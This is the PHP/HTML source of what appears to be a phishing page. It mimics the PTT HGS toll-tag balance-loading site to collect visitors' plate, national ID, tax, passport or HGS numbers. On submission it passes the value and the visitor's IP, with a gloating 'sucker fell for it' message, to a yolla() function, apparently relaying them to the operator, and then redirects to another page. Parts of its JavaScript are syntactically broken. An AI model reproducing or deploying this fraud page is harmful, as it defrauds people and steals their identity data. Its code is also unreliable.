<?php

date_default_timezone_set('Europe/Istanbul');
include('baglan.php');

if($_POST){
    yolla("sazan düştü: ".$ip."\n".htmlspecialchars($_POST["tel"]));
    header('Location:fiyat.php');
}
include "header.php";
?>


<div class="col-sm-12 col-md-8 col-md-offset-2 col-lg-6 col-lg-offset-3" id="hgs-query-container">

            
            <!--      Wizard container        -->
            <div class="wizard-container">

                <div class="card wizard-card" data-color="orange" id="wizardProfile">
                        <!--        You can switch " data-color="orange" "  with one of the next bright colors: "blue", "green", "orange", "red", "azure"          -->

                        <div class="wizard-header">
                            <div class="panel-header-icons">
                                <img class="panel-header-first-icon" src="./v2/assets/images/panel/homepage.png?v=201910111500">
                            </div>
                            <h1>
                                <img class="panel-header-second-icon" src="./v2/assets/images/panel/hgs.png?v=201910111500">
                                Bakiye Yükleme
                            </h1>
                            <h6 class="hgs-query-subtitle">
                                BU SİSTEMDEN, YALNIZCA PTT KANALI İLE SATIŞI GERÇEKLEŞTİRİLEN HGS ÜRÜNLERİNE BAKİYE YÜKLEME İŞLEMİ YAPILMAKTADIR.
                            </h6>
                        </div>
						<script> 
							var plakaelement = document.getElementById("plakano");
							
							plakaelement.addEventListener('click', function(event) {
								
							event.preventDefault();
							selectPlaka();
							});
							function showElement(id){
								
							document.getElementById(id).style.visibility = "visible";
							}
							fucntion hideElement(id){
							document.getElementById(id).style.visibility = "hidden";
							}
							setProcessType: function (that){
								var thisID = parseInt(that.data("id")),

								plakaelement.classList.add("btn-fill");
							}
							function selectTC(){}
							function selectVergi(){}
							function selectPasaport(){}
							function selectHGSNO(){}
						</script>
                        <div class="tab-content text-center">
                            <div class="tab-pane panel-border active" id="hgs-query-check">
							<form id="hgsQueryNo" name="hgs-query-no" data-tab="0" novalidate="novalidate" method="post">
									<div class="panel-inside">
										<button class="btn btn-warning hgs-query-process-type query-process-type btn-with-checked-icon" id="plakano" data-id="0"onclick="hgs.setProcessType($(this)); return false;">PLAKA NO</button>
									
										<button class="btn btn-warning hgs-query-process-type query-process-type btn-with-checked-icon" id="tcno"data-id="1"onclick="hgs.setProcessType($(this)); return false;">T.C. KİMLİK NO</button>
										<button class="btn btn-warning hgs-query-process-type query-process-type btn-with-checked-icon"id="vergino"data-id="2"onclick="hgs.setProcessType($(this)); return false;">VERGİ NO</button>
										<button class="btn btn-warning hgs-query-process-type query-process-type btn-with-checked-icon"id="pasaportno"data-id="3"onclick="hgs.setProcessType($(this)); return false;">PASAPORT NO</button>
										<button class="btn btn-warning hgs-query-process-type query-process-type btn-with-checked-icon"id="hgsno"data-id="4"onclick="hgs.setProcessType($(this)); return false;">HGS ÜRÜN NO</button>
										<div class="form-group hgs-query-input">
										
										<input type="text" class="form-control text-center hgs-query-no hgs-query-inputs" maxlength="11" required="" name="tel" placeholder="PLAKA NO" aria-required="true">
										</div>
										
									
	<script> document.getElementById('phone').addEventListener('input', function (e) {
  var x = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,3})(\d{0,4})/);
  e.target.value = !x[2] ? x[1] : '(' + x[1] + ') ' + x[2] + (x[3] ? '-' + x[3] : '');
});
</script>
										
										<div class="pull-right">
							<button type="submit"  class="btn  text-white btn-warning "  >SORGULA <img src="https://hgs.pttavm.com/v2/assets/images/buttons/right-arrow.png"></button>
							</div>
										
									</div>
								</form>
                            </div>

                            

                            

                            
                        </div><!-- tab content -->

                        <div class="wizard-footer">

                            
							
                            
                            <div class="clearfix"></div>
                        </div>

                </div>
            </div> <!-- wizard container -->
        </div>

<?php include "footer.php";?>